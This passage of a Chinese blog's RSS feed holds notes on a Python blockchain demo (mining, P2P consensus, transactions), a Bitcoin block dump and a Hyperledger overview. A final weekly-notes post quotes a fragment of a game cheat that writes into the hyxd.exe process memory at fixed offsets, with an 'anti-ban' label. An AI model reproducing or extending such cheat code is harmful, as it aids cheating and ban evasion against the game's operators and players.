201</code></pre><hr><p><strong>新建交易</strong></p><p>这个函数比较重要，意在添加一笔交易在当前的区块中，当区块中存在了多笔交易，或者是BTC网络中的 十分钟一次的HeartBeat，之后，我们的节点开始一次Mine，当计算出了Proof的值之后，就把这个区块入链。这样我们的交易记录就永远的存在于区块值之中了。这样的一次次的极记录也就构成了我们的UTXO的模型。当一个用户开始转账时候，由节点负责这个交易的合法性校验。</p><p><strong>UTXO中，你的输出是不能大于你的输入的，你输出多少，你就减去多少。</strong></p><pre><code>def new_transaction(self, sender, recipient, amount):    &quot;&quot;&quot;    :param sender: Address of the Sender    :param recipient: Address of the Recipient    :param amount: Amount    :return: The index of the Block that will hold this transaction    &quot;&quot;&quot;    self.current_transactions.append({        # 这里在我们当前的区块数据中追加我们的交易        &apos;sender&apos;: sender,        &apos;recipient&apos;: recipient,        &apos;amount&apos;: amount,    })    return self.last_block[&apos;index&apos;] + 1        # 区块数据索引加一</code></pre><p>这里的交易记录是十分简单的，可以看到有三个键 <strong><code>sender, recipient, amount</code></strong>.发送者，接收者，和总额。</p><p>​<br>         last_block = blockchain.last_block<br>        proof = blockchain.proof_of_work(last_block)    </p><pre><code># 这里是我们的mine的区块奖励，这个recipient也就是我们的CoinBase账户，他将得到我们的区块奖励blockchain.new_transaction(    sender=&quot;0&quot;,    recipient=node_identifier,    amount=1,)# 这里很重要，整个区块的内容进行一个Hash。保持数据不变previous_hash = blockchain.hash(last_block)block = blockchain.new_block(proof, previous_hash)</code></pre><p>上面的代码的功能可以去看前面的<strong>Mine</strong>部分，实际上这里没有进行交易的合法性检验，不过代码简易~</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>代码简易，所以还是忽略了许许多多的细节问题，比如交易的合法性，和实际的账户等等。不过我们可以看见，区块的本质实际上就是这些TX的不断Append而构成的。</p><hr><p><strong>BTC 区块数据</strong><br>这里贴出的是随便找到的比特币的第123个区块的数据</p><blockquote><p><span class="exturl" data-url="aHR0cHM6Ly93ZWJidGMuY29tL2Jsb2NrLzAwMDAwMDAwYTNiYmU0ZmQxZGExNmEyOWRiZGFiYTAxY2MzNWQ2ZmM3NGVlMTdmNzk0Y2YzYWFiOTRmN2FhYTA=" title="https://webbtc.com/block/00000000a3bbe4fd1da16a29dbdaba01cc35d6fc74ee17f794cf3aab94f7aaa0">区块内容<i class="fa fa-external-link"></i></span></p></blockquote><p>早期区块里的内容是十分的少的，所以我们可以很清楚的看见区块中的数据，现在的区块的大小在2M（比特币扩容问题，后面会再讲）。<br>每条交易的数据大小大概在200B左右，所以每个区块大概有10000个这样的交易存着。</p><p>下面尝试着看看内容~</p><pre><code>{        // 块hash  &quot;hash&quot;: &quot;00000000a3bbe4fd1da16a29dbdaba01cc35d6fc74ee17f794cf3aab94f7aaa0&quot;,  &quot;ver&quot;: 1,      // 前块hash  &quot;prev_block&quot;: &quot;000000008d98d186565441057e87cc03251b95b9042956c9fb11325e2d4a847a&quot;,  &quot;mrkl_root&quot;: &quot;b944ef8c77f9b5f4a4276880f17256988bba4d0125abc54391548061a688ae09&quot;,  &quot;time&quot;: 1231677823,    // unix的时间戳转换为北京时间是 2009/1/11 20:43:43  &quot;bits&quot;: 486604799,      &quot;nonce&quot;: 4094077204,    // nonce 类比于我们的Proof  &quot;n_tx&quot;: 1,            // 一个 tx  &quot;size&quot;: 216,            // 总大小 216B7  &quot;tx&quot;: [    {      &quot;hash&quot;: &quot;b944ef8c77f9b5f4a4276880f17256988bba4d0125abc54391548061a688ae09&quot;,      &quot;ver&quot;: 1,      &quot;vin_sz&quot;: 1,      &quot;vout_sz&quot;: 1,      &quot;lock_time&quot;: 0,      &quot;size&quot;: 135,      &quot;in&quot;: [        {          &quot;prev_out&quot;: {            &quot;hash&quot;: &quot;0000000000000000000000000000000000000000000000000000000000000000&quot;,            &quot;n&quot;: 4294967295          },          &quot;coinbase&quot;: &quot;04ffff001d02df00&quot;        }      ],      &quot;out&quot;: [        {          &quot;value&quot;: &quot;50.00000000&quot;,          &quot;scriptPubKey&quot;: &quot;04b715afd59b31be928e073e375a6196d654a78d9aa709789665dd4aecf1b85ebc850ffb90a1c04f18565afe0be4a042ff6629c398f674a5c632b017d793dc8e04 OP_CHECKSIG&quot;        }      ],      &quot;nid&quot;: &quot;3445a53aefbc184c37229153c5b619759f9836458d69ffa1874b79614e4f6c7b&quot;    }  ],  &quot;mrkl_tree&quot;: [    &quot;b944ef8c77f9b5f4a4276880f17256988bba4d0125abc54391548061a688ae09&quot;  ],  &quot;next_block&quot;: &quot;00000000ceae2b1cb578f066bd08c672fe87814880671c205febb2d624184f21&quot;}</code></pre><h2 id="后面的话"><a href="#后面的话" class="headerlink" title="后面的话"></a>后面的话</h2><p>到此，自己一共写了这是第三篇文章了。也是已经慢慢的读完了，并理解了这个简易的 区块链的demo。实话，真的收益匪浅。</p><p>虽然代码简易，一些具体的实现细节并不存在，不过也正是因为这个，才更容易理解。所以自己还要进一步的理解区块链的源码，下一个目标，就是BTC源码把！！！！加油年轻人。</p>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2018/03/12/BC_pyMyBC_3/#disqus_thread</comments>
    </item>
    
    <item>
      <title>Py区块链源码笔记 （2）P2P网络</title>
      <link>https://www.diglp.xyz/2018/03/11/BC_pyMyBC_2/</link>
      <guid>https://www.diglp.xyz/2018/03/11/BC_pyMyBC_2/</guid>
      <pubDate>Sat, 10 Mar 2018 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;p&gt;怎么学习区块链知识呢? 各种的资料看的头大，还是晕晕乎乎。所以那不如自己实现一个吧？？&lt;/p&gt;
&lt;p&gt;说是自己实现，实际上想先对&lt;span class=&quot;exturl&quot;
          
        
      
      </description>
      
      <content:encoded><![CDATA[<p>怎么学习区块链知识呢? 各种的资料看的头大，还是晕晕乎乎。所以那不如自己实现一个吧？？</p><p>说是自己实现，实际上想先对<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3F1YXJ0ejAxMC9ibG9ja2NoYWlu" title="https://github.com/quartz010/blockchain">源码<i class="fa fa-external-link"></i></span>进行解读。这里给出的源码，是一个基于Python实现的一个功能较为健全的区块链。下面给出项目地址</p><blockquote><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3F1YXJ0ejAxMC9ibG9ja2NoYWlu" title="https://github.com/quartz010/blockchain">项目地址<i class="fa fa-external-link"></i></span></p></blockquote><h2 id="P2P网络"><a href="#P2P网络" class="headerlink" title="P2P网络"></a>P2P网络</h2><h3 id="为什么使用P2P"><a href="#为什么使用P2P" class="headerlink" title="为什么使用P2P"></a>为什么使用P2P</h3><p>我们日常里用的磁链，迅雷之类的东西都是P2P技术实现的，所以P2P这个名词听起来不会太陌生。</p><p>其实在这里是对P2P技术的一种泛化，指的是这一类的去中心化的网络。所以P2P在区块链里面就是显得十分重要了。</p><p>一个P2P网络的功能基本大致可以有一下三个：</p><ul><li>路由拓展    可以在自己的路由表里，发现或者初始化添加其他路由节点<br>   节点路由    请求向其他节点路由<br>   节点保存    把已知节点写入我们的路由表</li></ul><hr><h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p>这里是其项目里的测试代码</p><blockquote><p>这个测试模块可以参考python的unittest这个module。</p></blockquote><p>这里的测试类是用于节点注册测试<br>​<br>    class TestRegisterNodes(BlockchainTestCase):</p><pre><code>def test_valid_nodes(self):    blockchain = Blockchain()    blockchain.register_node(&apos;http://192.168.0.1:5000&apos;)        # 可见该函数是实现节点注册    self.assertIn(&apos;192.168.0.1:5000&apos;, blockchain.nodes)def test_malformed_nodes(self):        # 畸形节点测试    blockchain = Blockchain()    blockchain.register_node(&apos;http//192.168.0.1:5000&apos;)        # 应该自行排除畸形节点    self.assertNotIn(&apos;192.168.0.1:5000&apos;, blockchain.nodes)def test_idempotency(self):            # 对等性测试    blockchain = Blockchain()    blockchain.register_node(&apos;http://192.168.0.1:5000&apos;)    blockchain.register_node(&apos;http://192.168.0.1:5000&apos;)    assert len(blockchain.nodes) == 1</code></pre><h4 id="节点注册"><a href="#节点注册" class="headerlink" title="节点注册"></a>节点注册</h4><p>核心函数<code>blockchain.register_node()</code></p><pre><code>def register_node(self, address):    &quot;&quot;&quot;    Add a new node to the list of nodes    :param address: Address of node. Eg. &apos;http://192.168.0.5:5000&apos;    &quot;&quot;&quot;    parsed_url = urlparse(address)    if parsed_url.netloc:        self.nodes.add(parsed_url.netloc)    elif parsed_url.path:        # Accepts an URL without scheme like &apos;192.168.0.5:5000&apos;.        self.nodes.add(parsed_url.path)    else:        raise ValueError(&apos;Invalid URL&apos;)</code></pre><p><strong>urlparse()</strong> 的Doc </p><pre><code>&gt;&gt;&gt; from urllib.parse import urlparse&gt;&gt;&gt; o = urlparse(&apos;http://www.cwi.nl:80/%7Eguido/Python.html&apos;)&gt;&gt;&gt; o   ParseResult(scheme=&apos;http&apos;, netloc=&apos;www.cwi.nl:80&apos;, path=&apos;/%7Eguido/Python.html&apos;,            params=&apos;&apos;, query=&apos;&apos;, fragment=&apos;&apos;)&gt;&gt;&gt; o.scheme&apos;http&apos;&gt;&gt;&gt; o.port80&gt;&gt;&gt; o.geturl()&apos;http://www.cwi.nl:80/%7Eguido/Python.html&apos;</code></pre><p>可见这个方法可以很容易的解析url。所以在工程代码里。是对域名，和路径的提取。如果不是合法值，就直接Raise一个异常</p><p><strong>添加node</strong><br>​<br>在构造函数中有<code>self.nodes = set()</code>所以可见这个是一个集合。</p><pre><code>self.nodes.add(parsed_url.path)        # 这行代码就是添加节点的地址</code></pre><p>这里在这个项目里有些过度简化。只是实现了节点添加的功能。</p><pre><code># Flask 的route修饰符@app.route(&apos;/nodes/register&apos;, methods=[&apos;POST&apos;])def register_nodes():values = request.get_json()nodes = values.get(&apos;nodes&apos;)if nodes is None:    return &quot;Error: Please supply a valid list of nodes&quot;, 400for node in nodes:    blockchain.register_node(node)response = {    &apos;message&apos;: &apos;New nodes have been added&apos;,    &apos;total_nodes&apos;: list(blockchain.nodes),}return jsonify(response), 201</code></pre><p>这里代码可见，把node的list以json的形式直接post上去。解析之后直接append。</p><hr><h3 id="节点解析-resolve"><a href="#节点解析-resolve" class="headerlink" title="节点解析(resolve)"></a>节点解析(resolve)</h3><p>这段代码是请求的节点更新的代码，因为一个去中心的网络，需要实施的维护个更新自己的数据。也就是区块链中的账本。所以这段代码算是实现了简单的<strong>DAO</strong>(Distributed Autonomous Organization),翻译过来是<strong>分布式自治组织</strong>。</p><p>节点之间进行互相的请求，以确保自己的区块高度是目前的最高区块，如果当前区块不是最高，则在其他的路由节点获取当前的区块信息。</p><pre><code>@app.route(&apos;/nodes/resolve&apos;, methods=[&apos;GET&apos;])    # 请求响应def consensus():replaced = blockchain.resolve_conflicts()        # 区块冲突解决if replaced:                response = {        &apos;message&apos;: &apos;Our chain was replaced&apos;,    # 如果其他节点区块高度大于我们，则更新我们的节点        &apos;new_chain&apos;: blockchain.chain    }else:    response = {        &apos;message&apos;: &apos;Our chain is authoritative(当局的)&apos;,    # 如果我们是最新，就保持        &apos;chain&apos;: blockchain.chain    }return jsonify(response), 200</code></pre><p>下面这段就是我们的区块更新的代码，同等简单的方式，更新获取相邻节点的区块高度。进行append判断。这里实现简单的共识算法，使用使用最高网络区块直接替换来解决区块的冲突。</p><p>实际上，这里的共识的实现是十分重要和复杂的一个要点。因为在全部网络上，我们不可避免的存在着<strong>拜占庭节点</strong>（byzantine）来作恶。如果我们使用直接最高区块的简单的共识算法。那么网络上的的拜占庭节点，可随随便便的编造区块数据，并且使用PoS把他的伪造交易数据添加到链上。大家发现他是最高的，所以纷纷认为他是对的。这样对网络是毁灭性的打击</p><pre><code>def resolve_conflicts(self):    &quot;&quot;&quot;    :return: True if our chain was replaced, False if not    &quot;&quot;&quot;    neighbours = self.nodes    new_chain = None    # 找到我们自己的区块高度    max_length = len(self.chain)    # 获取并且验证我们在网络上得到的区块    for node in neighbours:        response = requests.get(f&apos;http://{node}/chain&apos;)        # 获取网络节点的完整链，        if response.status_code == 200:            length = response.json()[&apos;length&apos;]        # 得到区块高度            chain = response.json()[&apos;chain&apos;]        # 和当前的完整链            # 检查是否最长链，并且检验链的有效性            if length &gt; max_length and self.valid_chain(chain):        # 最长链，并进行合法性检验                max_length = length                    new_chain = chain    #  如果有效且最长，我们替换我们的本地链    if new_chain:        self.chain = new_chain        return True    return False</code></pre><p>可见这里就实现了一个简易的区块共识协议，我们可以称之为最长就是最好 2333</p><hr><p><strong>合法区块检测</strong></p><p>用于判断获取的链的合法性，简单的说就是进行；链上区块遍历，判断其hash是否成链，即 <code>block[&#39;previous_hash&#39;] != self.hash(last_block)</code> ,并且对区块的 proof ，last_proof，previous_hash ，进行一次hash计算，判断是否是四个0 开头的</p><blockquote><p>PoS 的过程可以看上一篇的内容 <span class="exturl" data-url="aHR0cDovL2Jsb2cuZGlnbHAueHl6LzIwMTgvMDMvMTEvcHlNeUJDJTIwKDI=" title="http://blog.diglp.xyz/2018/03/11/pyMyBC%20(2">挖矿<i class="fa fa-external-link"></i></span>/)`</p></blockquote><pre><code>def valid_chain(self, chain):    &quot;&quot;&quot;    :param chain: A blockchain    :return: True if valid, False if not    &quot;&quot;&quot;    last_block = chain[0]    current_index = 1    while current_index &lt; len(chain):        # 遍历链上区块        block = chain[current_index]        print(f&apos;{last_block}&apos;)        print(f&apos;{block}&apos;)        print(&quot;\n-----------\n&quot;)        # 检查hash是否成链        if block[&apos;previous_hash&apos;] != self.hash(last_block):            return False        # 检查proof（nonce）是否合法        if not self.valid_proof(last_block[&apos;proof&apos;], block[&apos;proof&apos;], last_block[&apos;previous_hash&apos;]):            return False        last_block = block        current_index += 1    return True</code></pre><p>所以我们可以看到，区块链之所以安全，其内核基本就是靠这里所描述的功能保护的，虽然这里的代码是十分简易，不过大体上也是描述出了灵魂所在。可以使用hssh链，进行整个链的合法性校验，所以，使得链上的数据修改基本成为<strong>不可能！！！</strong></p><hr><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>这里的源码实现的P2P网络是比较简单，这里只是实现了节点的添加，并没有实现节点路由和拓展，及路由表的查询。所以后面打算自己可以实现一个</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>这篇可能比较水，因为源码本身实在太过简化，后面考虑自己添加部分功能，可以及时PR÷</p>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2018/03/11/BC_pyMyBC_2/#disqus_thread</comments>
    </item>
    
    <item>
      <title>Py区块链源码笔记 （1）挖矿</title>
      <link>https://www.diglp.xyz/2018/03/09/BC_pyMyBC_1/</link>
      <guid>https://www.diglp.xyz/2018/03/09/BC_pyMyBC_1/</guid>
      <pubDate>Thu, 08 Mar 2018 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;p&gt;怎么学习区块链知识呢? 各种的资料看的头大，还是晕晕乎乎。所以那不如自己实现一个吧？？&lt;/p&gt;
&lt;p&gt;说是自己实现，实际上想先对&lt;span class=&quot;exturl&quot;
          
        
      
      </description>
      
      <content:encoded><![CDATA[<p>怎么学习区块链知识呢? 各种的资料看的头大，还是晕晕乎乎。所以那不如自己实现一个吧？？</p><p>说是自己实现，实际上想先对<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3F1YXJ0ejAxMC9ibG9ja2NoYWlu" title="https://github.com/quartz010/blockchain">源码<i class="fa fa-external-link"></i></span>进行解读。这里给出的源码，是一个基于Python实现的一个功能较为健全的区块链。下面给出项目地址</p><blockquote><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3F1YXJ0ejAxMC9ibG9ja2NoYWlu" title="https://github.com/quartz010/blockchain">项目地址<i class="fa fa-external-link"></i></span></p></blockquote><h2 id="挖矿（mine）"><a href="#挖矿（mine）" class="headerlink" title="挖矿（mine）"></a>挖矿（mine）</h2><h3 id="什么是挖矿"><a href="#什么是挖矿" class="headerlink" title="什么是挖矿"></a>什么是挖矿</h3><p>当然进入币圈或者链圈的人当然对挖矿这个词不会陌生。区块链的核心问题就是解决了拜占庭将军问题，实现了全网的可信。在比特币网络里面，每十分钟产生的数据成为一个block。这个块被所有的矿工一起进行计算。其中有一个nonce的值。一旦有一个矿工挖到了这个特定值。那么就挖到了这个block。可以得到coinbase的奖励。</p><blockquote><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC81ZmVhMzBiMjVmMGE=" title="https://www.jianshu.com/p/5fea30b25f0a">拜占庭将军问题<i class="fa fa-external-link"></i></span></p></blockquote><h3 id="源码的实现"><a href="#源码的实现" class="headerlink" title="源码的实现"></a>源码的实现</h3><h4 id="Web端"><a href="#Web端" class="headerlink" title="Web端"></a>Web端</h4><p>这里是使用了python的Flask模块作为一个web的服务端。</p><pre><code>app = Flask(__name__)# 这里的@说明是函数修饰符，后面有说明@app.route(&apos;/mine&apos;, methods=[&apos;GET&apos;])def mine():    ...    return jsonify(response), 200app.run(host=&apos;0.0.0.0&apos;, port=5000)</code></pre><p>这里就可以实现后端的对前端的GET请求的响应，执行挖矿操作后，返回Json的信息。</p><hr><h4 id="Python的函数修饰符"><a href="#Python的函数修饰符" class="headerlink" title="Python的函数修饰符"></a>Python的函数修饰符</h4><p>这里的 <code>@app.route(&#39;/mine&#39;, methods=[&#39;GET&#39;])</code>是一个对函数的修饰符，和solidity里面的modifier差不多。其意在执行完了修饰符的函数之后，才会继续执行下面修释的函数</p><pre><code>def test(f):      print &quot;before ...&quot;      f()  # 这里指代的就是所修饰函数    print &quot;after ...&quot;  @test  def func():      print &quot;func was called&quot;  # 直接运行，输出结果：before ...  func was called  after ...  # 所以这里可以看出上述代码等价于test(func)    # func 是个pointer</code></pre><h4 id="Miner"><a href="#Miner" class="headerlink" title="Miner"></a>Miner</h4><p>这里是miner的代码，这里实现了一个简单的挖矿过程，虽然和实际的挖矿过程还是有些差距，不过也正是简单易读，所以我们好理解。</p><h4 id="miner的请求处理"><a href="#miner的请求处理" class="headerlink" title="miner的请求处理"></a>miner的请求处理</h4><pre><code>@app.route(&apos;/mine&apos;, methods=[&apos;GET&apos;])def mine():    # 这里使用PoWPoW共识机制。    # 这里的返回了一个ARRAY的tail其定义是 chain = []    last_block = blockchain.last_block                # 这里使用PoW，代码后面展开    proof = blockchain.proof_of_work(last_block)    </code></pre><p>​<br>​        # We must receive a reward for finding the proof.<br>​        # The sender is “0” to signify that this node has mined a new coin.<br>​        # 翻译过来，这个就是区块奖励，也就是CoinBase,<br>​        # 作为一个区块的第一笔交易，所以发送者是零地址。<br>​<br>        blockchain.new_transaction(<br>            sender=”0”,<br>            recipient=node_identifier,<br>            amount=1,<br>        )</p><pre><code># 把这个    区块加到链尾，实现了到主链的融合previous_hash = blockchain.hash(last_block)block = blockchain.new_block(proof, previous_hash)# 这里把新的区块数据反馈到前端response = {    &apos;message&apos;: &quot;New Block Forged&quot;,    &apos;index&apos;: block[&apos;index&apos;],    &apos;transactions&apos;: block[&apos;transactions&apos;],    &apos;proof&apos;: block[&apos;proof&apos;],    &apos;previous_hash&apos;: block[&apos;previous_hash&apos;],}return jsonify(response), 200</code></pre><h4 id="PoW的实现代码"><a href="#PoW的实现代码" class="headerlink" title="PoW的实现代码"></a>PoW的实现代码</h4><pre><code>def proof_of_work(self, last_block):    &quot;&quot;&quot;    一段简单的工作量证明的算法:    &quot;&quot;&quot;    last_proof = last_block[&apos;proof&apos;]    last_hash = self.hash(last_block)    proof = 0    while self.valid_proof(last_proof, proof, last_hash) is False:        proof += 1    return proof</code></pre><p>​<br>上述代码的实际上的工作原理： 先使得 proof的值为零，之后慢慢的递增。直到找到</p><p><strong>找到一个数字<code>P</code>，使得<code>Hash(P,P&#39;)</code>的哈希值是前面包含了4个0的，这里的`P’是上一个区块的P值</strong> </p><p>实际上我们的挖矿的过程和这个差不多，这个P在实际上是一个nonce(number once)的值。这里一样的进行了大量的简化</p><hr><p><strong>valid_proof</strong></p><pre><code># point ： 这里是py的特性F-strings，分别计算花括号的值，并且进行拼接guess = f&apos;{last_proof}{proof}{last_hash}&apos;.encode()    guess_hash = hashlib.sha256(guess).hexdigest()print(guess_hash)return guess_hash[:4] == &quot;0000&quot;</code></pre><p>这里就是对我们的Proof的值的<strong>合法性判断</strong>，</p><ul><li>先把上一个的proof，本次的proof，和上一个区块的hash进行一个拼接(F-string)之后进行编码。</li><li>对其进行sha256的hash。得到hash值。</li><li>之后判断该hash的值是否是以四个0结尾</li><li>返回是否找到合法的proof值，如果找到，返回True</li><li>返回上层函数PoW的过程结束</li></ul><p>这里是部分的打印结果：挖出第一个块的打印（第0块，是创世区块，设置的proof是100）</p><pre><code>f49bd479bb433aa37bcb01b36cc6e4f3f8881ae4cdfeecfc3fc84a2a69a29951d71f73e0d52ad34fbc8848d85890a0951773fafc6c7214fe94794cc9c2dca904312cc1a85835727e29b7d85ae0a781a35ab57376ae56e29f8e6a70e1f76eb1390000b1964e2a279761ab62cf0d52272f540867aee83bb22ffc6eb2e9bf63f3b1100 16623 ac018635f614a44ab203ef49fcb7887b36de048fd5d5a286a06c9b32666bd618</code></pre><p>我们可以看见，最后一行，我们的last_proof是100，这次我们尝试了 16623 次，得到了proof，使得他们的hash是以四个0开头的<br><strong>0000b1964e2a279761ab62cf0d52272f540867aee83bb22ffc6eb2e9bf63f3b1</strong></p><p>同样的下面是第二块</p><pre><code>42d9c8f25d3b438157c2e4cd06fff288600eb78ef9536aeec60dea13c46fb41d00006b342191c828ecfeeb21ad3cfe3320ded31d4a0bc64fcf5c103c5a8806cb16623 187207 58f183fc794d087ccce036e25ca039099af9738d7cdf5c23564def4254eb1281</code></pre><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>可见这里的代码很简单的实现了一个PoW的模型，proof可以类比于我们寻找的 nonce 的这个值，实际上，关于BTC的难度系数的动态调整，就是和这得到的hash的零的个数，和后面数值的有效的大小的要求而确定的。</p><p>这里我们在<span class="exturl" data-url="aHR0cHM6Ly9idGMuY29tLzAwMDAwMDAwMDAwMDAwMDAwMDQ3NDY5N2MxNzVkYWRkMTJiMTFmOTczNmMxMGUyYTYzMmFhNTJkN2E1NTVhMGY=" title="https://btc.com/000000000000000000474697c175dadd12b11f9736c10e2a632aa52d7a555a0f">BTC<i class="fa fa-external-link"></i></span>的区块链浏览器可以直接看到我们的区块数据。</p><blockquote><p><span class="exturl" data-url="aHR0cHM6Ly9idGMuY29tLzAwMDAwMDAwMDAwMDAwMDAwMDQ3NDY5N2MxNzVkYWRkMTJiMTFmOTczNmMxMGUyYTYzMmFhNTJkN2E1NTVhMGY=" title="https://btc.com/000000000000000000474697c175dadd12b11f9736c10e2a632aa52d7a555a0f">BTC里面的随便一个区块<i class="fa fa-external-link"></i></span></p></blockquote><ul><li>高度        512,589<br>   确认数    2<br>   大小        1,096,630 Bytes<br>   <strong>Nonce</strong>    <strong>0x185d9c75</strong><br>   时间        2018-03-08 22:05:10<br>   块哈希    </li><li>000000000000000000474697c175dadd12b11f9736c10e2a632aa52d7a555a0f<br>   前一个块    </li><li>00000000000000000000021c043e439b5f4b632389b0062306bf2d4e0b657c7c<br>   后一个块    </li><li>000000000000000000434de347737700f50cacde89f956e08ed4a39dddd23bf0 </li></ul><p>可以看到，其实，差不多2333.</p><h2 id="后面的话"><a href="#后面的话" class="headerlink" title="后面的话"></a>后面的话</h2><p>打算潜心学习，不能浮躁，慢慢的学习这些底层的原理和实现，后面应该会有关于交易（加密签名），组网（P2P）网络的内容</p>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2018/03/09/BC_pyMyBC_1/#disqus_thread</comments>
    </item>
    
    <item>
      <title>HyperLeager 入坑手册</title>
      <link>https://www.diglp.xyz/2018/03/07/HyperLedger/</link>
      <guid>https://www.diglp.xyz/2018/03/07/HyperLedger/</guid>
      <pubDate>Tue, 06 Mar 2018 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;h2 id=&quot;前&quot;&gt;&lt;a href=&quot;#前&quot; class=&quot;headerlink&quot;
          
        
      
      </description>
      
      <content:encoded><![CDATA[<h2 id="前"><a href="#前" class="headerlink" title="前"></a>前</h2><p>慢慢的发现区块链在各种企业的研究都进行的如火如荼，像是BAT，一类纷纷的推出了自己的区块链的小应用，莱茨狗啊，xx猫啊。虽然都是对之前以太坊应用的<span class="exturl" data-url="aHR0cHM6Ly93d3cuY3J5cHRva2l0dGllcy5jby8=" title="https://www.cryptokitties.co/">加密猫<i class="fa fa-external-link"></i></span>的抄袭不过也是反映出各个企业对区块链技术方面的尝试和探索。这是个很好的现象，资本力量的介入会大大的提高这个技术的生命力。</p><blockquote><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY3J5cHRva2l0dGllcy5jby8=" title="加密猫Dapp地址">加密猫项目地址<i class="fa fa-external-link"></i></span></p></blockquote><hr><p>不过有趣的现象是，虽然有许许多多的企业已经加入了这场浪潮，可是维护不见没见哪个企业出个什么XX币用来割韭菜？？</p><blockquote><p>实际上现在99%的ICO项目都是韭菜项目（都是ETH网络上几块钱的合约而已），真正的潜力项目炒作可不是第一位。他们实现的是真正基于区块链技术的应用。</p></blockquote><p>这样就要遇上我们的<span class="exturl" data-url="aHR0cHM6Ly93d3cuaHlwZXJsZWRnZXIub3JnLw==" title="https://www.hyperledger.org/"><code>Hyperledger</code><i class="fa fa-external-link"></i></span>了</p><h2 id="What’s-Hyperledger"><a href="#What’s-Hyperledger" class="headerlink" title="What’s Hyperledger"></a>What’s Hyperledger</h2><blockquote><p> 超级账本（hyperledger）是Linux基金会于2015年发起的推进区块链数字技术和交易验证的开源项目，加入成员包括：荷兰银行（ABN AMRO）、埃森哲（Accenture）等十几个不同利益体，目标是让成员共同合作，共建开放平台，满足来自多个不同行业各种用户案例，并简化业务流程。由于点对点网络的特性，分布式账本技术是完全共享、透明和去中心化的，故非常适合于在金融行业的应用，以及其他的例如制造、银行、保险、物联网等无数个其他行业。通过创建分布式账本的公开标准，实现虚拟和数字形式的价值交换，例如资产合约、能源交易、结婚证书、能够安全和高效低成本的进行追踪和交易。    </p></blockquote><p>以上是HyperLedger的简介。所以我们可以看出<code>Hyperledger</code>实际上不是一种区块链产品（像是BTC，ETH，etc.）</p><h2 id="Why-HyperLedger"><a href="#Why-HyperLedger" class="headerlink" title="Why HyperLedger"></a>Why HyperLedger</h2><p>现在已经有许许多多基于区块链技术的产品（项目），那么蛋蛋使用HL的又是又在哪里？</p><h3 id="和BTC或者Ethereum的区别"><a href="#和BTC或者Ethereum的区别" class="headerlink" title="和BTC或者Ethereum的区别"></a>和BTC或者Ethereum的区别</h3><ul><li>比特币：一个记录“比特币交易”的分布式账本</li><li>超级账本Fabric：一个记录“链上代码+Docker容器状态”的分布式账本</li><li>以太坊：一个记录“以太币余额+链上代码+EMV虚拟机状态”的分布式账本</li></ul><p>上面的三种技术都是基于区块链实现的。由于BTC只是使用这个技术实现了一个UTXO的交易模型。所以这里对比ETH和HL</p><p>以太坊是公链，大家一起挖矿进行网络的维护。而hyperledger 可以说是一种开发框架，使用这个框架就可以实现一个属于自己的私链（不是人人可加入的）。所以大企业们纷纷的使用HL。因为公链信息是公开的，谁都可以查得到。所以HL的私有性质使得被选择。</p>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2018/03/07/HyperLedger/#disqus_thread</comments>
    </item>
    
    <item>
      <title>一周干货集 (3)</title>
      <link>https://www.diglp.xyz/2018/03/07/misc_%E4%B8%80%E5%91%A8%E6%9D%82%E8%AE%B0_3/</link>
      <guid>https://www.diglp.xyz/2018/03/07/misc_%E4%B8%80%E5%91%A8%E6%9D%82%E8%AE%B0_3/</guid>
      <pubDate>Tue, 06 Mar 2018 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;h2 id=&quot;前&quot;&gt;&lt;a href=&quot;#前&quot; class=&quot;headerlink&quot;
          
        
      
      </description>
      
      <content:encoded><![CDATA[<h2 id="前"><a href="#前" class="headerlink" title="前"></a>前</h2><p>现在是2018年的第十周了。突然换了个环境，发现自己久久不能适应。各种拖延症，各种不想动，也是不知为何。可能是到了致郁期。还是闭上眼睛早早的过去吧。</p><h2 id="外挂基本原理"><a href="#外挂基本原理" class="headerlink" title="外挂基本原理"></a>外挂基本原理</h2><p>最近各种颓废的吃鸡。慢慢的又是那种被模式制约的感觉。所以也是想当当神仙。所以网上找了一波辅助。</p><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3F1YXJ0ejAxMC9odWFuZ3lleGluZ2RvbmctYnVn" title="https://github.com/quartz010/huangyexingdong-bug">GitHub<i class="fa fa-external-link"></i></span></p><p>其实一直有自己写辅助的想法，可是好久好久，也只是个想法。这次不知哪位dalao在Hub上放出了源码。</p><p>对源码大体看了看，区区500行，实在说不上复杂。答题分一下几个部分</p><ul><li>取得进程RVA</li><li>进行偏移，对属性地址写内存</li><li>进入消息循环</li><li>响应快捷键，写内存</li></ul><p>具体的结构还是很简单的。</p><pre><code>DWORD maincode = GetModuleBaseAddress (pid, &quot;hyxd.exe&quot;);//天空变黑防封;DWORD FLY_BAN = maincode + 0x64F573;DWORD FLY_BAN_TMP = maincode + 0x64F2F9;WriteNumProcessMemory (pid, FLY_BAN_TMP, 24);WriteByteProcessMemory (pid, FLY_BAN, tobyte (to16 (0xF30F590D, FLY_BAN_TMP, addre), bits));</code></pre><p>这里就是找基址的部分，和直接对特定偏移的内存写。</p><h2 id="delete-和-delete-区别"><a href="#delete-和-delete-区别" class="headerlink" title="delete 和 delete []区别"></a>delete 和 delete []区别</h2><p>delete 